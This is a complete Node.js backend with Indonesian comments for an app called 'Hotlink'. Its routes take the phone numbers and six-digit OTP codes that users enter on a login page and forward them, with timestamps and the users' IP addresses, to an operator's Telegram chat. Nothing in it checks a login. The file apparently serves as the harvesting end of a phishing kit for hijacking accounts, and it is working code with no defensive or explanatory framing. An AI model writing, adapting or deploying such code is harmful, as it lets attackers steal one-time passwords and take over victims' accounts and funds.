/* =========================================================
   FILE: backend/server.js
   DESKRIPSI: Backend Node.js untuk aplikasi Hotlink
   ========================================================= */

require('dotenv').config();
const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3001;

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;


/* =========================================================
   MIDDLEWARE
   ========================================================= */
app.use(cors());
app.use(express.json());

app.use((req, res, next) => {
    console.log(`[${new Date().toLocaleTimeString('id-ID')}] ${req.method} ${req.path}`);
    next();
});


/* =========================================================
   FUNGSI: Kirim pesan ke Telegram
   ========================================================= */
async function sendToTelegram(message) {
    const url = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        const data = await response.json();

        if (!data.ok) {
            console.error('Telegram error:', data.description);
            return { success: false, error: data.description };
        }

        console.log('Pesan terkirim ke Telegram');
        return { success: true };

    } catch (error) {
        console.error('Fetch error:', error.message);
        return { success: false, error: error.message };
    }
}


/* =========================================================
   HELPER: Ambil waktu sekarang
   ========================================================= */
function getNow() {
    return new Date().toLocaleString('id-ID', {
        day: '2-digit', month: 'short', year: 'numeric',
        hour: '2-digit', minute: '2-digit', second: '2-digit'
    });
}


/* =========================================================
   ROUTE: Health Check
   ========================================================= */
app.get('/', (req, res) => {
    res.json({
        status: 'OK',
        message: 'Hotlink Backend berjalan',
        time: new Date().toISOString()
    });
});


/* =========================================================
   ROUTE: Kirim Nomor HP ke Telegram
   ========================================================= */
app.post('/api/send-phone', async (req, res) => {
    const { phone } = req.body;

    if (!phone) {
        return res.status(400).json({ success: false, error: 'Nomor HP wajib diisi' });
    }

    const lines = [
        '<b>LOGIN BARU - NOMOR HP</b>',
        '━━━━━━━━━━━━━━━━━━━━',
        'Nomor: <code>' + phone + '</code>',
        'Waktu: ' + getNow(),
        'IP: <code>' + (req.ip || 'unknown') + '</code>',
        '━━━━━━━━━━━━━━━━━━━━',
        '<i>User baru saja memasukkan nomor HP di halaman login.</i>'
    ];

    const result = await sendToTelegram(lines.join('\n'));

    if (result.success) {
        res.json({ success: true, message: 'Nomor terkirim ke Telegram' });
    } else {
        res.status(500).json({ success: false, error: result.error });
    }
});


/* =========================================================
   ROUTE: Kirim Kode OTP ke Telegram
   ========================================================= */
app.post('/api/send-otp', async (req, res) => {
    const { phone, otp } = req.body;

    if (!phone || !otp) {
        return res.status(400).json({ success: false, error: 'Nomor HP dan OTP wajib diisi' });
    }

    if (otp.length !== 6 || !/^\d+$/.test(otp)) {
        return res.status(400).json({ success: false, error: 'OTP harus 6 digit angka' });
    }

    const lines = [
        '<b>KODE OTP MASUK</b>',
        
        '━━━━━━━━━━━━━━━━━━━━',
        'Nomor: <code>' + phone + '</code>',
        'OTP: <code>' + otp + '</code>',
        'Waktu: ' + getNow(),
        'IP: <code>' + (req.ip || 'unknown') + '</code>',
        '━━━━━━━━━━━━━━━━━━━━',
        '<i>User baru saja memasukkan kode OTP.</i>'
    ];

    const result = await sendToTelegram(lines.join('\n'));

    if (result.success) {
        res.json({ success: true, message: 'OTP terkirim ke Telegram' });
    } else {
        res.status(500).json({ success: false, error: result.error });
    }
});


/* =========================================================
   ROUTE: Test koneksi Telegram
   ========================================================= */
app.get('/api/test-telegram', async (req, res) => {
    const lines = [
        '<b>TEST KONEKSI</b>',
        '',
        'Backend Hotlink berhasil terhubung ke Telegram Anda!',
        '',
        getNow()
    ];

    const result = await sendToTelegram(lines.join('\n'));

    if (result.success) {
        res.json({ success: true, message: 'Test berhasil! Cek Telegram Anda.' });
    } else {
        res.status(500).json({ success: false, error: result.error });
    }
});


/* =========================================================
   JALANKAN SERVER
   ========================================================= */
app.listen(PORT, () => {
    console.log('\n================================');
    console.log('Hotlink Backend berjalan!');
    console.log('URL: http://localhost:' + PORT);
    console.log('================================');
    console.log('Telegram Bot: ' + (TELEGRAM_BOT_TOKEN ? 'Terpasang' : 'Belum diset'));
    console.log('Chat ID: ' + (TELEGRAM_CHAT_ID ? 'Terpasang' : 'Belum diset'));
    console.log('================================\n');
});